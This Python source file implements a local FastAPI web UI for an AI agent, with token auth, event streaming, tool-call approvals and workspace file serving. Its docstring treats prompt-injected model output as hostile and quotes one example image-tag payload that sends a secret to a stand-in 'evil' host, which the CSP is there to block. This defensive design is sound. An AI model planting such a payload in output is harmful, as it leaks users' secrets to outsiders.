"""`solfish serve`: a local web UI over the same sessions the terminal uses.

    browser --REST--> FastAPI --> SessionManager --> Agent (worker thread)
    browser <--SSE--- EventHub <------- events -------'

Only 127.0.0.1 is bound, and every API call needs the token in ~/.solfish/token. The page renders
text the model wrote, and the model reads web pages and papers written by strangers, so the page is
treated as hostile input: Markdown is sanitised, and a strict CSP stops scripts and images from
anywhere but this server (an injected `<img src=https://evil/?q=secret>` can't phone home).
"""

from __future__ import annotations

import asyncio
import contextlib
import json
import mimetypes
import secrets
import webbrowser
from collections.abc import AsyncIterator
from pathlib import Path
from typing import Any

from fastapi import Depends, FastAPI, HTTPException, Request
from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from .app import DEFAULT_SKILLS
from .config import Settings
from .session import Busy, SessionManager

WEB = Path(__file__).parent / "web"
COOKIE = "solfish_token"
CSP = (
    "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self'; "
    "img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'"
)
# Workspace files the browser may show inline; anything else (HTML, SVG, ...) downloads.
INLINE_TYPES = {"application/pdf", "image/png", "image/jpeg", "image/gif", "image/webp", "text/plain"}


def load_token(settings: Settings) -> str:
    path = settings.home / "token"
    if not path.exists():
        settings.ensure_dirs()
        path.write_text(secrets.token_urlsafe(24))
        path.chmod(0o600)
    return path.read_text().strip()


class EventHub:
    """Bridges the agent's threads to the event loop: one queue per open SSE connection."""

    def __init__(self) -> None:
        self.loop: asyncio.AbstractEventLoop | None = None
        self.queues: set[asyncio.Queue[str]] = set()

    def __call__(self, session_id: str, kind: str, data: dict[str, Any]) -> None:
        if self.loop is None:
            return
        event = json.dumps({"session": session_id, "kind": kind, **data}, ensure_ascii=False, default=str)
        for q in list(self.queues):
            try:
                self.loop.call_soon_threadsafe(q.put_nowait, event)
            except RuntimeError:  # loop already closed: the server is shutting down
                return

    async def stream(self, keepalive_s: float = 15.0) -> AsyncIterator[str]:
        q: asyncio.Queue[str] = asyncio.Queue()
        self.queues.add(q)
        try:
            yield ": connected\n\n"
            while True:
                try:
                    yield f"data: {await asyncio.wait_for(q.get(), keepalive_s)}\n\n"
                except TimeoutError:
                    yield ": ping\n\n"  # keeps proxies and the browser from timing out
        finally:
            self.queues.discard(q)


def transcript(messages: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """The stored history flattened into what the page draws, in order."""
    items: list[dict[str, Any]] = []
    for m in messages:
        content = m["content"]
        if isinstance(content, str):
            items.append({"kind": "user", "text": content})
            continue
        for b in content:
            t = b.get("type")
            if t == "text" and b.get("text"):
                items.append({"kind": "assistant", "text": b["text"]})
            elif t == "thinking" and b.get("thinking"):
                items.append({"kind": "thinking", "text": b["thinking"]})
            elif t == "tool_use":
                items.append({"kind": "tool_call", "id": b["id"], "name": b["name"], "input": b["input"]})
            elif t == "tool_result":
                output = b.get("content", "")
                if isinstance(output, list):
                    output = "\n".join(x.get("text", "") for x in output)
                items.append({"kind": "tool_result", "id": b["tool_use_id"], "output": output,
                              "is_error": bool(b.get("is_error"))})
    return items


class NewMessage(BaseModel):
    text: str


class Decision(BaseModel):
    allow: bool


def create_app(manager: SessionManager, token: str) -> FastAPI:
    hub = EventHub()
    manager.subscribe(hub)

    @contextlib.asynccontextmanager
    async def lifespan(_: FastAPI) -> AsyncIterator[None]:
        hub.loop = asyncio.get_running_loop()
        yield

    app = FastAPI(title="Solfish", docs_url=None, redoc_url=None, openapi_url=None, lifespan=lifespan)
    app.mount("/static", StaticFiles(directory=WEB), name="static")
    workspace = manager.settings.workspace.resolve()

    def authed(request: Request) -> bool:
        header = request.headers.get("authorization", "").removeprefix("Bearer ")
        given = request.cookies.get(COOKIE) or header
        return secrets.compare_digest(given.encode(), token.encode())

    def require_auth(request: Request) -> None:
        if not authed(request):
            raise HTTPException(401, "Open the link printed by `solfish serve`.")

    def session_or_404(session_id: str) -> None:
        if manager.store.get(session_id) is None:
            raise HTTPException(404, f"No session {session_id}.")

    @app.get("/", response_class=HTMLResponse)
    def index(request: Request) -> Any:
        given = request.query_params.get("token")
        if given is not None:
            if not secrets.compare_digest(given.encode(), token.encode()):
                raise HTTPException(401, "Wrong token.")
            # Trade the link's token for a cookie, so it leaves the address bar and history.
            response = RedirectResponse("/", status_code=303)
            response.set_cookie(COOKIE, token, httponly=True, samesite="strict", max_age=90 * 86400)
            return response
        if not authed(request):
            return HTMLResponse("<p>Open the link printed by <code>solfish serve</code>.</p>", 401)
        return HTMLResponse((WEB / "index.html").read_text(encoding="utf-8"),
                            headers={"Content-Security-Policy": CSP})

    api = [Depends(require_auth)]

    @app.get("/api/sessions", dependencies=api)
    def list_sessions() -> list[dict[str, Any]]:
        return [{"id": r["id"], "title": r["title"], "channel": r["channel"], "updated_at": r["updated_at"],
                 "busy": manager.busy(r["id"])} for r in manager.store.recent(50)]

    @app.post("/api/sessions", dependencies=api, status_code=201)
    def create_session() -> dict[str, str]:
        return {"id": manager.create("web")}

    @app.get("/api/sessions/{session_id}", dependencies=api)
    def get_session(session_id: str) -> dict[str, Any]:
        session_or_404(session_id)
        t = manager.totals(session_id)
        return {
            "id": session_id,
            "title": manager.store.get(session_id)["title"],
            "busy": manager.busy(session_id),
            "items": transcript(manager.history(session_id)),
            "pending": [{"id": a.id, "name": a.name, "input": a.input}
                        for a in manager.approvals.pending(session_id)],
            "cost_usd": t.cost_usd,
        }

    @app.post("/api/sessions/{session_id}/messages", dependencies=api, status_code=202)
    def send(session_id: str, body: NewMessage) -> dict[str, bool]:
        session_or_404(session_id)
        if not body.text.strip():
            raise HTTPException(422, "Empty message.")
        try:
            manager.send(session_id, body.text.strip())
        except Busy:
            raise HTTPException(409, "Still working on the last message.") from None
        return {"ok": True}

    @app.post("/api/sessions/{session_id}/cancel", dependencies=api)
    def cancel(session_id: str) -> dict[str, bool]:
        session_or_404(session_id)
        manager.cancel(session_id)
        return {"ok": True}

    @app.get("/api/approvals", dependencies=api)
    def pending_approvals() -> list[dict[str, Any]]:
        return [{"id": a.id, "session": a.session_id, "name": a.name, "input": a.input}
                for a in manager.approvals.pending()]

    @app.post("/api/approvals/{approval_id}", dependencies=api)
    def decide(approval_id: str, body: Decision) -> dict[str, bool]:
        if not manager.approvals.resolve(approval_id, body.allow):
            raise HTTPException(404, "No such pending approval (answered elsewhere, or timed out).")
        return {"ok": True}

    @app.get("/api/events", dependencies=api)
    def events() -> StreamingResponse:
        return StreamingResponse(hub.stream(), media_type="text/event-stream",
                                 headers={"Cache-Control": "no-cache"})

    @app.get("/api/files", dependencies=api)
    def list_files() -> list[dict[str, Any]]:
        if not workspace.is_dir():
            return []
        files = [f for f in workspace.rglob("*")
                 if f.is_file() and not any(p.startswith(".") for p in f.relative_to(workspace).parts)]
        files.sort(key=lambda f: f.stat().st_mtime, reverse=True)
        return [{"path": f.relative_to(workspace).as_posix(), "size": f.stat().st_size,
                 "mtime": f.stat().st_mtime} for f in files[:100]]

    @app.get("/api/files/{path:path}", dependencies=api)
    def get_file(path: str) -> FileResponse:
        target = (workspace / path).resolve()
        if not target.is_relative_to(workspace) or not target.is_file():
            raise HTTPException(404, "No such file in the workspace.")
        kind = mimetypes.guess_type(target.name)[0] or "application/octet-stream"
        return FileResponse(
            target,
            media_type=kind,
            content_disposition_type="inline" if kind in INLINE_TYPES else "attachment",
            filename=target.name,
            headers={"X-Content-Type-Options": "nosniff"},
        )

    return app


def serve(settings: Settings, *, skills: tuple[str, ...] = DEFAULT_SKILLS, port: int = 8765,
          open_browser: bool = False) -> int:
    import uvicorn

    token = load_token(settings)
    app = create_app(SessionManager(settings, skills=skills), token)
    url = f"http://127.0.0.1:{port}/?token={token}"
    print(f"Solfish is at {url}\nCtrl-C to stop.", flush=True)  # flush: stdout may be a log file
    if open_browser:
        webbrowser.open(url)
    uvicorn.run(app, host="127.0.0.1", port=port, log_level="warning")
    return 0
